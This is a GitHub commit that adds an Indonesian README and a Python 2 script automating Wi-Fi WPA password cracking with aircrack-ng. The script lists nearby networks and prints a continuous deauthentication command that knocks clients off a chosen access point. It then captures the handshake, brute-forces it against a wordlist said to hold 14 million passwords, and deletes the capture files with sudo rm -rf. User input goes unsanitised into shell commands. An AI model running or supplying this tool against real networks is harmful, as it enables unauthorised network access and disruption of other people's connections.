eb54970c6d23571710db2fe5c513ddcdaff45645
alanward <85589842+alanward55@users.noreply.github.com>
2021-06-10 19:02:50 +0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,48 @@
+# Wlan
+Wlan adalah script dasar brute force dengan wordlist yang berisikan 14 juta kata sandi<br>
+
+# Instalasi
+```
+apt update
+apt upgrade -y
+apt install python2 -y
+apt install iwconfig -y
+apt install aircrack-ng -y
+apt install git -y
+git clone https://github.com/alanward55/wlan
+cd wlan
+python2 wifi.py
+```
+## Cara Menggunakan
+-> Jalankan script<br>
+-> Isikan nama interface adapter wifi anda (paling bawah, biasanya wla0)<br>
+-> Tunggu beberapa saat sampai semua wifi terbaca, lalu tekan ctrl+c<br>
+-> Salin alamat BSSID nya<br>
+-> Tempelkan pada tempatnya<br>
+-> Tulis Nomor CH wifi<br>
+-> Setelah jendela terminal baru terbuka, salin command yang harus disalin kemudian tempelkan pada jendela baru, kemudian enter<br>
+-> Masukkan lokasi untuk menyimpan handshake<br>
+	/home = home atau root<br>
+	/user = nama user linux kalian<br>
+	/folder = nama folder (wifi adalah nama folder bawaan)<br>
+	/file = nama file (tanpa menyertakan garis miring "/" diakhir)<br>
+-> Contoh: /home/alan/wifi/handshake
+-> Enter lalu tunggu hingga handshake ditemukan (wpa handshake found!)<br>
+-> Kemudian tekan ctrl+c lalu masukkan lokasi wordlist<br>
+-> Lokasi wordlist bawaan adalah /home/user/wifi/worlist.txt<br>
+-> /home bisa saja ditukar dengan root<br>
+-> /user sesuaikan dengan username linux anda<br>
+-> Kemudian tekan enter dan tunggu hingga wordlist menemukan kata sandi yang sesuai<br>
+
+## PENTING!!!
+Script tidak akan berjalan baik jika lokasi handshake atau wordlist tidak tepat
+
+# Join
+
+# Hubungi Saya
+Email : ondeuli@gmail.com<br>
+Phone : +6285326728933
+
+# Donasi
+Dana : 085326728933
+Doge : D7CeRA5VqnAGN7h4iL33N3ywx4pXUCLvWM
---
+++ wifi.py
@@ -0,0 +1,85 @@
+# -*- coding: utf-8 -*-
+import os, sys, time, re, requests, traceback
+
+print 'Starting.........'
+time.sleep(1)
+os.system('sudo airmon-ng check kill')
+os.system('clear')
+print '\033[0;32m             █     █░ ██▓    ▄▄▄       ███▄    █ '
+print '\033[0;32m            ▓█░ █ ░█░▓██▒   ▒████▄     ██ ▀█   █ '
+print '\033[0;32m            ▒█░ █ ░█ ▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒'
+print '\033[0;32m            ░█░ █ ░█ ▒██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒'
+print '\033[0;32m            ░░██▒██▓ ░██████▒▓█   ▓██▒▒██░   ▓██░'
+print '\033[0;32m            ░ ▓░▒ ▒  ░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ▒ ▒ '
+print '\033[0;32m              ▒ ░ ░  ░ ░ ▒  ░ ▒   ▒▒ ░░ ░░   ░ ▒░'
+print '\033[0;32m              ░   ░    ░ ░    ░   ▒      ░   ░ ░ '
+print '\033[0;32m                ░        ░  ░     ░  ░         ░ '
+print '\033[0;32m +-----------------------------------------------------------+'
+print '\033[0;32m |Script ini dibuat oleh alanward55 pada tanggal 05 Juni 2021|'
+print '\033[0;32m +-----+-------------------------+---------------------+-----+'
+print '\033[0;32m       |Email: ondeuli@gmail.com |Phone: +6285326728933|'
+print '\033[0;32m       +-------------------------+---------------------+'
+print '\033[1;31m ====================[Copyright © 2021]======================='
+print '\033[0;32m________________________________________________________________'
+os.system('iwconfig')
+
+itf = raw_input('\033[0;32mMasukkan jenis interface: ')
+
+os.system('sudo airodump-ng '+ itf)
+
+print('\033[1;32mCopas BSSID nya!')
+
+time.sleep(3)
+
+bssid = raw_input('Masukkan BSSID: ')
+c = raw_input('Masukkan nomor CH: ')
+print('\n')
+print 'sudo aireplay-ng -0 0 -a',bssid ,itf ,'&& exit'
+print('''
+Pastekan command diatas pada tab yang baru terbuka
+kemudian enter, tunggu 30 detik
+kemudian tekan ctrl + c''')
+os.system('xdotool key ctrl+shift+n')
+print '\033[0;32m_____________________________'
+time.sleep(10)
+
+hsfile = raw_input('''
+Masukkan lokasi untuk menyimpan handshake 
+Contoh: /home/user/wifi/file
+Lokasi: ''')
+os.system('sudo airodump-ng --bssid '+ bssid +' -c '+ c +' -w '+hsfile+' '+itf)
+
+print('\033[1;31mHandshake berhasil tersimpan!')
+print '\033[0;32m__________'
+animasi = ['#', '##', '###', '####', '#####', '######', '#######', '########', '#########', '##########', ]
+for i in range(len(animasi)):
+	time.sleep(0.3)
+	sys.stdout.write('\r' + animasi[i % len(animasi)])
+	sys.stdout.flush()
+print '\033[0;32m\n__________'
+wd = raw_input('''
+Masukkan lokasi wordlist: 
+Contoh: /home/user/wifi/wordlist.txt
+Lokasi: ''')
+time.sleep(2)
+print('\nREADY!')
+time.sleep(3)
+os.system('sudo aircrack-ng '+hsfile+'-01.cap -w '+wd)
+print ('\033[1;31m\nDeleting chace.................')
+time.sleep(1)
+os.system('sudo rm -rf '+hsfile+'-01.cap')
+time.sleep(1)
+os.system('sudo rm -rf '+hsfile+'-01.csv')
+time.sleep(1)
+os.system('sudo rm -rf '+hsfile+'-01.kismet.csv')
+time.sleep(1)
+os.system('sudo rm -rf '+hsfile+'-01.kismet.netxml')
+time.sleep(1)
+os.system('sudo rm -rf '+hsfile+'-01.log.csv')
+time.sleep(1)
+print '\033[0;32m_______________________________________'
+os.system('sudo airmon-ng start '+itf)
+os.system('sudo airmon-ng stop '+itf+'mon')
+print ('\nTerimakasih telah menggunakan script ini')
+print ('\nExiting.............')
+time.sleep(3)
